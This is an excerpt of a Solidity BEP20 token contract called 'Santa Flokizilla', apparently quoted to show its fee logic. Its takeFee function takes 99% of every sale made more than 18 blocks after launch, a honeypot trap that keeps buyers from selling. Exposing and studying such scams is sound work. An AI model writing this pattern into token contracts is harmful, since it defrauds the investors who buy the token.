...
contract SantaFlokizilla is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Santa Flokizilla";
    string constant _symbol = "SantaFlokizilla";
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 18 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
